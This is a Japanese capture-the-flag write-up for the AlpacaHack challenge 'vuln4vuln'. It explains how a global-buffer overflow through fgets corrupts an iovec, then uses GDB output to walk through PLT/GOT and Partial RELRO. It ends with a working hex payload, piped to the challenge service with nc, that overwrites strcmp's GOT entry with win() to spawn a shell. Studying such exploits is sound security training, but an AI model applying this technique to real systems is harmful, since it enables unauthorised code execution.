# vuln4vuln

https://alpacahack.com/daily/challenges/vuln4vuln

## 問題の概要

サーバーで動いているバイナリ `chal` とそのソースコード `chal.c` が与えられています。

```c:chal.c からの抜粋
char name[0x10];
char passwd[0x10];
struct iovec iov;

void win() {
    execve("/bin/sh", NULL, NULL);
}

int main() {
    iov.iov_base = passwd;
    iov.iov_len = sizeof(passwd);
    fgets(name,0x28,stdin);
    readv(STDIN_FILENO,&iov,1);
    if (strcmp(passwd, PASSWD) == 0) {
        printf("Welcome! %s\n",name);
    } else {
        printf("Wait a minute, who are you?\n");
    }
}
```

`passwd` 比較を成功させてもフラグは表示されないため、なんとかして `win()` を実行させる必要があります。

## 問題の分析

### バイナリ情報

```
$ file chal
chal: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=....., for GNU/Linux 3.2.0, not stripped

$ checksec chal
[*] '...../chal'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

### GDB での解析

`name` 周辺のメモリを確認すると、グローバル変数 `name`、`passwd`、`iov` が連続して配置されていることがわかります。

```
Breakpoint 2, 0x0000000000401254 in main ()
=> 0x0000000000401254 <main+58>:        e8 77 fe ff ff          call   0x4010d0 <fgets@plt>
(gdb) x/48bx &name
0x404070 <name>:        0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x404078 <name+8>:      0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x404080 <passwd>:      0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x404088 <passwd+8>:    0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x404090 <iov>:         0x80    0x40    0x40    0x00    0x00    0x00    0x00    0x00
0x404098 <iov+8>:       0x10    0x00    0x00    0x00    0x00    0x00    0x00    0x00
```

`iov` の先頭 8 バイト(`iov.iov_base`) が読み込み先のアドレス、次の 8 バイト(`iov.iov_len`) が読み込み長です。

`fgets(name, 0x28, stdin)` で `name[0x10]` の範囲を超えて `name` に入力できるため、`passwd` と `iov` の先頭7バイト目まで上書きできるため、うまく `name` を入力すれば次の `readv(STDIN_FILENO, &iov, 1)` で任意のアドレスに `0x10` バイト分の入力を書き込むことが可能です。

## 方針を考える

何をどのように書き換えれば `win()` を実行できるかを考えます。

** `main()` 関数内の命令を書き換えできるか？ **

→ `main()` 関数があるコードセクション `.text` は書き込み不可のため無理です。

** `main()` 関数のリターンアドレスを書き換えできるか？ **

→ スタックのリターンアドレスは SHSTK (Shadow Stack) で保護されているため無理です。
SHSTK はスタックのリターンアドレスを Shadow Stack という別の場所にコピーし、リターン時に両方のリターンアドレスが一致しているかを検証する仕組みです。

また、スタックのアドレスは ASLR (Address Space Layout Randomization) でランダム化されていると考えられるため、リターンアドレスの位置を特定する必要がありますが、今回の問題では難しそうです。

** GOTを書き換えて `win()` を実行させることはできるか？ **

今回のバイナリは Partial RELRO (Relocation Read-Only) で GOT (Global Offset Table) が書き換え可能です。PIE (Position Independent Executable) でないため GOT や `win()` の位置が固定されており、静的に特定することができます。

ということで GOT を書き換えて `win()` を実行させる方針で行くことにします。

## PLT と GOT

ELF で `fgets` や `strcmp` のような外部関数を呼び出すとき、静的リンクでなければ実行ファイルのリンク時点ではこれらの関数のアドレスはわからないため、PLT (Procedure Linkage Table) を介して次のように呼び出されます。

1. `call fgets@plt` で PLT 関数を呼び出す
2. PLT 関数内で GOT (Global Offset Table) `fgets@got.plt` を参照して `fgets` を実行

`fgets@got.plt` は `fgets` のアドレスを格納する場所で、動的リンカによって実行時に `fgets` のアドレスが書き込まれます。

Full RELRO であればプログラム起動時点で動的リンクがロードされ、GOT は書き換え不可になりますが、今回のバイナリは lazy loading のために GOT が書き換え可能な Partial RELRO になっています。

### GDB で確認してみる

`main()` 関数の `fgets()` 呼び出し部分をみてみましょう。

```s
(gdb) disassemble main
Dump of assembler code for function main:
.....
   0x000000000040123b <+33>:    mov    0x2e1e(%rip),%rax        # 0x404060 <stdin@GLIBC_2.2.5>
   0x0000000000401242 <+40>:    mov    %rax,%rdx
   0x0000000000401245 <+43>:    mov    $0x28,%esi
   0x000000000040124a <+48>:    lea    0x2e1f(%rip),%rax        # 0x404070 <name>
   0x0000000000401251 <+55>:    mov    %rax,%rdi
   0x0000000000401254 <+58>:    call   0x4010d0 <fgets@plt>
.....
```

`call 0x4010d0 <fgets@plt>` のように PLT 関数が呼び出されていることがわかります。

PLT 関数の中身は次のようになっています。

```s
(gdb) disassemble 0x4010d0
Dump of assembler code for function fgets@plt:
   0x00000000004010d0 <+0>:     endbr64
   0x00000000004010d4 <+4>:     jmp    *0x2f3e(%rip)        # 0x404018 <fgets@got.plt>
   0x00000000004010da <+10>:    nopw   0x0(%rax,%rax,1)
End of assembler dump.
```

`jmp *0x2f3e(%rip)` の部分で アドレス `0x404018 <fgets@got.plt>` (= `0x2f3e + 0x4010da`) の値を読み込み、その値が指すアドレスにジャンプしています。

`fgets()` の初回呼び出し前後で `fgets@got.plt` の値を確認してみると、実行後に実体のアドレスが書き込まれていることがわかります。

```s
Breakpoint 2, 0x0000000000401254 in main ()
(gdb) x/i $rip
=> 0x401254 <main+58>:  call   0x4010d0 <fgets@plt>
(gdb) x/g 0x404018
0x404018 <fgets@got.plt>:       0x0000000000401060
(gdb) ni
aaaaaa
0x0000000000401259 in main ()
(gdb) x/g 0x404018
0x404018 <fgets@got.plt>:       0x00007ae2ac2bb670
```

## 解法

`fgets` で `iov.iov_base` を書き換え、`readv` で `<strcmp@got.plt>` に `win()` のアドレスを書き込むようにすれば、`strcmp` を呼び出すときに `win()` が実行されるようになります。

`gdb` で　`info address` を使うとアドレスを確認できます。

```s
(gdb) info address win
Symbol "win" is at 0x4011f6 in a file compiled without debugging.
(gdb) info address strcmp@got.plt
Symbol "strcmp@got.plt" is at 0x404028 in a file compiled without debugging.
```

## 回答に使用した入力

```text:input.hex
00 00 00 00  00 00 00 00
00 00 00 00  00 00 00 00
00 00 00 00  00 00 00 00
00 00 00 00  00 00 00 00
28 40 40 00  00 00 00
f6 11 40 00  00 00 00 00
00 00 00 00  00 00 00 00
```

実行方法:

```bash
(xdd -r -p input.hex; echo "cat flag.txt") | nc localhost 9999
```
